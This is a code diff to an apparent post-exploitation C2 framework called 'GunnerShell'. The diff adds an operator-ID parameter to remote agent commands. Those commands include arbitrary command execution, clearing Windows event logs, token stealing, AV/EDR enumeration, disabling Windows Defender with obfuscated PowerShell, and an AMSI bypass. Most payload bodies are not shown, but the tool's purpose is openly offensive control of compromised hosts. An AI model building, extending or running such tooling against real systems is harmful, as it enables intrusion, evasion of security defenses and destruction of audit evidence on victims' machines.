@@ -12,7 +12,7 @@ from core import shell
 import core.listeners.tcp_listener as tcp_listener
 
 from core.payload_generator.payload_generator import *
-from core.payload_generator.common import malleable_c2 as malleable
+from core.malleable_c2 import malleable_c2 as malleable
 
 
 from colorama import init, Fore, Style
@@ -28,7 +28,7 @@ PROMPT = f"{UNDERLINE_ON}{brightblue}GunnerShell{UNDERLINE_OFF} > "
 
 
 
-def sysinfo(sid, os_type):
+def sysinfo(sid, os_type, op_id="console"):
     """
     Get basic system information (OS, architecture, hostname, user).
     """
@@ -62,11 +62,11 @@ def sysinfo(sid, os_type):
         return brightred + f"[!] No such session: {display}"
 
     if sess.transport.lower() in ("http", "https"):
-        return shell.run_command_http(sid, cmd) or None
+        return shell.run_command_http(sid, cmd, op_id=op_id) or None
     else:
-        return shell.run_command_tcp(sid, cmd, timeout=1.0, portscan_active=True) or None
+        return shell.run_command_tcp(sid, cmd, timeout=1.0, portscan_active=True, op_id=op_id) or None
 
-def ps(sid, os_type):
+def ps(sid, os_type, op_id="console"):
     """
     List running processes on the remote host.
     """
@@ -97,11 +97,11 @@ def ps(sid, os_type):
         return brightred + f"[!] No such session: {display}"
 
     if sess.transport.lower() in ("http", "https"):
-        return shell.run_command_http(sid, cmd) or None
+        return shell.run_command_http(sid, cmd, op_id=op_id) or None
     else:
-        return shell.run_command_tcp(sid, cmd, timeout=1.0, portscan_active=True) or None
+        return shell.run_command_tcp(sid, cmd, timeout=1.0, portscan_active=True, op_id=op_id) or None
 
-def getuid(sid, os_type):
+def getuid(sid, os_type, op_id="console"):
     """
     Get the current user identity.
     """
@@ -117,11 +117,11 @@ def getuid(sid, os_type):
         return brightred + f"[!] No such session: {display}"
 
     if sess.transport.lower() in ("http", "https"):
-        return shell.run_command_http(sid, cmd) or None
+        return shell.run_command_http(sid, cmd, op_id=op_id) or None
     else:
-        return shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True) or None
+        return shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True, op_id=op_id) or None
 
-def getprivs(sid, os_type):
+def getprivs(sid, os_type, op_id="console"):
     """
     Attempt to enable and display privileges of the current process.
     """
@@ -139,11 +139,11 @@ def getprivs(sid, os_type):
         return brightred + f"[!] No such session: {display}"
 
     if sess.transport.lower() in ("http", "https"):
-        return shell.run_command_http(sid, cmd) or None
+        return shell.run_command_http(sid, cmd, op_id=op_id) or None
     else:
-        return shell.run_command_tcp(sid, cmd, timeout=1.0, portscan_active=True) or None
+        return shell.run_command_tcp(sid, cmd, timeout=1.0, portscan_active=True, op_id=op_id) or None
 
-def getpid(sid, os_type):
+def getpid(sid, os_type, op_id="comsole"):
     """
     Get the current process ID on the remote host.
     """
@@ -161,12 +161,12 @@ def getpid(sid, os_type):
         return brightred + f"[!] No such session: {display}"
 
     if sess.transport.lower() in ("http", "https"):
-        return shell.run_command_http(sid, cmd) or None
+        return shell.run_command_http(sid, cmd, op_id=op_id) or None
 
     else:
-        return shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True) or None
+        return shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True, op_id=op_id) or None
 
-def getenv(sid, os_type, *vars):
+def getenv(sid, os_type, *vars, op_id="console"):
     """
     Retrieve environment variables from the remote host.
       Usage:
@@ -194,11 +194,11 @@ def getenv(sid, os_type, *vars):
         return brightred + f"[!] No such session: {display}"
 
     if sess.transport.lower() in ("http", "https"):
-        return shell.run_command_http(sid, cmd) or None
+        return shell.run_command_http(sid, cmd, op_id=op_id) or None
     else:
-        return shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True) or None
+        return shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True, op_id=op_id) or None
 
-def exec(sid, os_type, *cmd_parts):
+def exec(sid, os_type, *cmd_parts, op_id="console"):
     """
     Execute an arbitrary command on the remote host.
       Usage: exec <command> [args...]
@@ -215,13 +215,13 @@ def exec(sid, os_type, *cmd_parts):
         return brightred + f"[!] No such session: {display}"
 
     if sess.transport.lower() in ("http","https"):
-        out = shell.run_command_http(sid, cmd)
+        out = shell.run_command_http(sid, cmd, op_id=op_id)
     else:
-        out = shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True)
+        out = shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True, op_id=op_id)
 
     return out or ""
 
-def kill(sid, os_type, pid_str):
+def kill(sid, os_type, pid_str, op_id="console"):
     """
     Terminate the given PID on the remote host.
       Usage: kill <pid>
@@ -240,9 +240,9 @@ def kill(sid, os_type, pid_str):
         return brightred + f"[!] No such session: {display}"
 
     if sess.transport.lower() in ("http","https"):
-        out = shell.run_command_http(sid, cmd)
+        out = shell.run_command_http(sid, cmd, op_id=op_id)
     else:
-        out = shell.run_command_tcp(sid, cmd, timeout=1.0, portscan_active=True)
+        out = shell.run_command_tcp(sid, cmd, timeout=1.0, portscan_active=True, op_id=op_id)
 
     if out is None:
         return brightgreen + f"[*] Sent terminate to PID {pid_str}"
@@ -250,7 +250,7 @@ def kill(sid, os_type, pid_str):
     else:
         return out
 
-def getsid(sid, os_type):
+def getsid(sid, os_type, op_id="console"):
     """
     Retrieve the Windows SID of the current token.
     """
@@ -265,13 +265,13 @@ def getsid(sid, os_type):
         return brightred + f"[!] No such session: {display}"
 
     if sess.transport.lower() in ("http","https"):
-        out = shell.run_command_http(sid, cmd)
+        out = shell.run_command_http(sid, cmd, op_id=op_id)
     else:
-        out = shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True)
+        out = shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True, op_id=op_id)
 
     return out or ""
 
-def clearev(sid, os_type, force=False):
+def clearev(sid, os_type, force=False, op_id="console"):
     """
     Clear all Windows event logs.
 
@@ -316,13 +316,13 @@ def clearev(sid, os_type, force=False):
 
     # Dispatch
     if sess.transport.lower() in ("http", "https"):
-        out = shell.run_command_http(sid, ps_cmd)
+        out = shell.run_command_http(sid, ps_cmd, op_id=op_id)
     else:
-        out = shell.run_command_tcp(sid, ps_cmd, timeout=3, portscan_active=True)
+        out = shell.run_command_tcp(sid, ps_cmd, timeout=3, portscan_active=True, op_id=op_id)
 
     return out or brightgreen + "[*] Event logs cleared."
 
-def localtime(sid, os_type):
+def localtime(sid, os_type, op_id="console"):
     """
     Display the remote system’s local date and time.
     """
@@ -337,14 +337,14 @@ def localtime(sid, os_type):
         return brightred + f"[!] No such session: {display}"
 
     if sess.transport.lower() in ("http", "https"):
-        out = shell.run_command_http(sid, cmd)
+        out = shell.run_command_http(sid, cmd, op_id=op_id)
 
     else:
-        out = shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True)
+        out = shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True, op_id=op_id)
     
     return out or None
 
-def reboot(sid, os_type):
+def reboot(sid, os_type, op_id="console"):
     """
     Reboot the remote host immediately.
     """
@@ -359,14 +359,14 @@ def reboot(sid, os_type):
         return brightred + f"[!] No such session: {display}"
 
     if sess.transport.lower() in ("http", "https"):
-        out = shell.run_command_http(sid, cmd)
+        out = shell.run_command_http(sid, cmd, op_id=op_id)
 
     else:
-        out = shell.run_command_tcp(sid, cmd, timeout=3, portscan_active=True)
+        out = shell.run_command_tcp(sid, cmd, timeout=3, portscan_active=True, op_id=op_id)
     
     return out or None
 
-def pgrep(sid, os_type, pattern):
+def pgrep(sid, os_type, pattern, op_id="console"):
     """
     Filter processes by name/pattern.
     """
@@ -390,14 +390,14 @@ def pgrep(sid, os_type, pattern):
         return brightred + f"[!] No such session: {display}"
     
     if sess.transport.lower() in ("http", "https"):
-        out = shell.run_command_http(sid, cmd)
+        out = shell.run_command_http(sid, cmd, op_id=op_id)
 
     else:
-        out = shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True)
+        out = shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True, op_id=op_id)
     
     return out or None
 
-def pkill(sid, os_type, pattern):
+def pkill(sid, os_type, pattern, op_id="console"):
     """
     Terminate processes by name/pattern.
     """
@@ -419,14 +419,14 @@ def pkill(sid, os_type, pattern):
         return brightred + f"[!] No such session: {display}"
     
     if sess.transport.lower() in ("http", "https"):
-        out = shell.run_command_http(sid, cmd)
+        out = shell.run_command_http(sid, cmd, op_id=op_id)
 
     else:
-        out = shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True)
+        out = shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True, op_id=op_id)
     
     return out or None
 
-def suspend(sid, os_type, pid_str):
+def suspend(sid, os_type, pid_str, op_id="console"):
     """
     Suspend the given PID on the remote host.
       Usage: suspend <pid>
@@ -457,9 +457,9 @@ def suspend(sid, os_type, pid_str):
         return brightred + f"[!] No such session: {display}"
 
     if sess.transport.lower() in ("http","https"):
-        out = shell.run_command_http(sid, ps_cmd)
+        out = shell.run_command_http(sid, ps_cmd, op_id=op_id)
     else:
-        out = shell.run_command_tcp(sid, ps_cmd, timeout=2.0, portscan_active=True)
+        out = shell.run_command_tcp(sid, ps_cmd, timeout=2.0, portscan_active=True, op_id=op_id)
 
     if out == "0":
         return brightgreen + f"[*] PID {pid_str} successfully suspended"
@@ -471,7 +471,7 @@ def suspend(sid, os_type, pid_str):
         return brightred + f"[!] Failed to suspend process {pid_str}"
 
 
-def resume(sid, os_type, pid_str):
+def resume(sid, os_type, pid_str, op_id="console"):
     """
     Resume the given PID on the remote host.
       Usage: resume <pid>
@@ -499,9 +499,9 @@ def resume(sid, os_type, pid_str):
         return brightred + f"[!] No such session: {display}"
 
     if sess.transport.lower() in ("http","https"):
-        out = shell.run_command_http(sid, ps_cmd)
+        out = shell.run_command_http(sid, ps_cmd, op_id=op_id)
     else:
-        out = shell.run_command_tcp(sid, ps_cmd, timeout=2.0, portscan_active=True)
+        out = shell.run_command_tcp(sid, ps_cmd, timeout=2.0, portscan_active=True, op_id=op_id)
 
     if out == "0":
         return brightgreen + f"[*] PID {pid_str} successfully resumed"
@@ -512,7 +512,7 @@ def resume(sid, os_type, pid_str):
     else:
         return brightred + f"[!] Failed to resume process {pid_str}"
 
-def shutdown(sid, os_type, *args):
+def shutdown(sid, os_type, *args, op_id="console"):
     """
     Gracefully shut down or power off the remote host.
       Usage: shutdown          # immediate
@@ -542,13 +542,13 @@ def shutdown(sid, os_type, *args):
         return brightred + f"[!] No such session: {display}"
 
     if sess.transport.lower() in ("http","https"):
-        out = shell.run_command_http(sid, cmd)
+        out = shell.run_command_http(sid, cmd, op_id=op_id)
     else:
-        out = shell.run_command_tcp(sid, cmd, timeout=5.0, portscan_active=True)
+        out = shell.run_command_tcp(sid, cmd, timeout=5.0, portscan_active=True, op_id=op_id)
 
     return out or brightgreen + "[*] Shutdown/reboot issued."
 
-def reg(sid, os_type, action, hive, key_path, value_name=None, value_data=None):
+def reg(sid, os_type, action, hive, key_path, value_name=None, value_data=None, op_id="console"):
     """
     Interact with the Windows registry.
       Usage:
@@ -601,11 +601,11 @@ def reg(sid, os_type, action, hive, key_path, value_name=None, value_data=None):
         return brightred + f"[!] No such session: {display}"
 
     if sess.transport.lower() in ("http", "https"):
-        return shell.run_command_http(sid, cmd) or None
+        return shell.run_command_http(sid, cmd, op_id=op_id) or None
     else:
-        return shell.run_command_tcp(sid, cmd, timeout=3.0, portscan_active=True) or None
+        return shell.run_command_tcp(sid, cmd, timeout=3.0, portscan_active=True, op_id=op_id) or None
 
-def services(sid, os_type, action=None, svc_name=None):
+def services(sid, os_type, action=None, svc_name=None, op_id="console"):
     """
     List or control services on the remote host.
       Usage:
@@ -648,9 +648,9 @@ def services(sid, os_type, action=None, svc_name=None):
     if not sess:
         return brightred + f"[!] No such session: {display}"
 
-    out = (shell.run_command_http(sid, ps_cmd) 
+    out = (shell.run_command_http(sid, ps_cmd, op_id=op_id) 
            if sess.transport.lower() in ("http","https") 
-           else shell.run_command_tcp(sid, ps_cmd, timeout=5.0, portscan_active=True)
+           else shell.run_command_tcp(sid, ps_cmd, timeout=5.0, portscan_active=True, op_id=op_id)
           ) or ""
 
     # handle list
@@ -672,7 +672,7 @@ def services(sid, os_type, action=None, svc_name=None):
     # fallback if neither token seen
     return brightyellow + "[*] Unexpected output:\n" + out
 
-def netusers(sid, os_type):
+def netusers(sid, os_type, op_id="console"):
     """
     List local user accounts.
       Usage: netusers
@@ -689,12 +689,12 @@ def netusers(sid, os_type):
         return brightred + f"[!] No such session: {display}"
 
     if sess.transport.lower() in ("http","https"):
-        return shell.run_command_http(sid, cmd) or None
+        return shell.run_command_http(sid, cmd, op_id=op_id) or None
 
     else:
-        return shell.run_command_tcp(sid, cmd, timeout=1.0, portscan_active=True) or None
+        return shell.run_command_tcp(sid, cmd, timeout=1.0, portscan_active=True, op_id=op_id) or None
 
-def netgroups(sid, os_type):
+def netgroups(sid, os_type, op_id="console"):
     """
     List local group accounts.
       Usage: netgroups
@@ -711,12 +711,12 @@ def netgroups(sid, os_type):
         return brightred + f"[!] No such session: {display}"
 
     if sess.transport.lower() in ("http","https"):
-        return shell.run_command_http(sid, cmd) or None
+        return shell.run_command_http(sid, cmd, op_id=op_id) or None
 
     else:
-        return shell.run_command_tcp(sid, cmd, timeout=1.0, portscan_active=True) or None
+        return shell.run_command_tcp(sid, cmd, timeout=1.0, portscan_active=True, op_id=op_id) or None
 
-def steal_token(sid, os_type, *args):
+def steal_token(sid, os_type, *args, op_id="console"):
     global page_count
     page_count = 0
     """
@@ -905,10 +905,10 @@ def steal_token(sid, os_type, *args):
     display = next((a for a, rsid in session_manager.alias_map.items() if rsid == sid), sid)
 
     if sess.transport in ("tcp", "tls"):
-        out = shell.run_command_tcp(sid, priv_check, timeout=0.5, portscan_active=True)
+        out = shell.run_command_tcp(sid, priv_check, timeout=0.5, portscan_active=True, op_id=op_id)
 
     elif sess.transport in ("http", "https"):
-        out = shell.run_command_http(sid, priv_check)
+        out = shell.run_command_http(sid, priv_check, op_id=op_id)
 
     if "SUCCESS" in out:
         print(brightgreen + f"[*] Agent {display} has required privileges to steal token.")
@@ -1175,7 +1175,7 @@ if (-not $success) {{
     
     
     try:
-        result = _do_steal_and_launch(sid, opts.pid, ps_cmd)
+        result = _do_steal_and_launch(sid, opts.pid, ps_cmd, op_id=op_id)
         page_count = 2
         
 
@@ -1192,19 +1192,19 @@ if (-not $success) {{
             pass
 
 
-def _do_steal_and_launch(sid, pid, ps_payload):
+def _do_steal_and_launch(sid, pid, ps_payload, op_id="console"):
     # P/Invoke snippet for token steal + CreateProcessWithTokenW
     sess = session_manager.sessions[sid]
     if sess.transport in ('http','https'):
-        return shell.run_command_http(sid, ps_payload)
+        return shell.run_command_http(sid, ps_payload, op_id=op_id)
 
     elif sess.transport in ("tcp", "tls"):
-        return shell.run_command_tcp(sid, ps_payload, timeout=0.5, portscan_active=True)
+        return shell.run_command_tcp(sid, ps_payload, timeout=0.5, portscan_active=True, op_id=op_id)
 
     else:
         return brightred + f"[!] Unsupported session type!"
 
-def getav(sid, os_type):
+def getav(sid, os_type, op_id="console"):
     """
     Run a PowerShell one‑liner (via SecurityCenter2, registry, services, processes)
     to detect AV/EDR products on Windows. On non‑Windows, just prints a warning.
@@ -1291,10 +1291,10 @@ Get-AV_EDR
     transport = sess.transport.lower()
     
     if transport in ("http","https"):
-        out = shell.run_command_http(sid, ps)
+        out = shell.run_command_http(sid, ps, op_id=op_id)
     
     elif transport in ("tcp", "tls"):
-        out = shell.run_command_tcp(sid, ps, timeout=0.5, portscan_active=True)
+        out = shell.run_command_tcp(sid, ps, timeout=0.5, portscan_active=True, op_id=op_id)
 
     else:
         return brightred + "[!] Unknown session transport!"
@@ -1306,7 +1306,7 @@ Get-AV_EDR
         else:
             return out
 
-def groups(sid, os_type):
+def groups(sid, os_type, op_id="console"):
     """
     On Windows: run 'whoami /groups'
     On Linux:   run 'id -Gn'
@@ -1354,10 +1354,10 @@ else {{
     # dispatch via HTTP or TCP
     transport = sess.transport.lower()
     if transport in ("http", "https"):
-        out = shell.run_command_http(sid, cmd)
+        out = shell.run_command_http(sid, cmd, op_id=op_id)
     
     elif transport in ("tcp", "tls"):
-        out = shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True)
+        out = shell.run_command_tcp(sid, cmd, timeout=0.5, portscan_active=True, op_id=op_id)
 
     else:
         return brightred + "[!] Unknown session transport!"
@@ -1369,7 +1369,7 @@ else {{
         else:
             return out
 
-def defenderoff(sid, os_type):
+def defenderoff(sid, os_type, op_id="console"):
     """
     Disable Windows Defender using an obfuscated, base64-encoded PowerShell one‑liner.
     """
@@ -1407,10 +1407,10 @@ try {{
     transport = sess.transport.lower()
 
     if transport in ("http", "https"):
-        out = shell.run_command_http(sid, ps_cmd)
+        out = shell.run_command_http(sid, ps_cmd, op_id=op_id)
 
     elif transport in ("tcp", "tls"):
-        out = shell.run_command_tcp(sid, ps_cmd, timeout=1.0, portscan_active=True)
+        out = shell.run_command_tcp(sid, ps_cmd, timeout=1.0, portscan_active=True, op_id=op_id)
 
     else:
         return brightred + "[!] Unknown session transport!"
@@ -1422,7 +1422,7 @@ try {{
         elif "Good Job" in out:
             return "[+] Successfully disabled defender."
 
-def amsioff(sid, os_type):
+def amsioff(sid, os_type, op_id="console"):
     """
     Disable AMSI in‑memory via reflection bypass.
     """
@@ -1459,10 +1459,10 @@ if (-not $test) {{ Write-Output "Success" }} else {{ Write-Output "Nothing Found
 
     # dispatch (bypassing defender)
     if transport in ("http","https"):
-        out = shell.run_command_http(sid, ps_cmd)
+        out = shell.run_command_http(sid, ps_cmd, op_id=op_id)
     
     elif transport in ("tcp", "tls"):
-        out = shell.run_command_tcp(sid, ps_cmd, timeout=0.5, portscan_active=True)
+        out = shell.run_command_tcp(sid, ps_cmd, timeout=0.5, portscan_active=True, op_id=op_id)
 
     else:
         return brightred + "[!] Unknown session transport!"
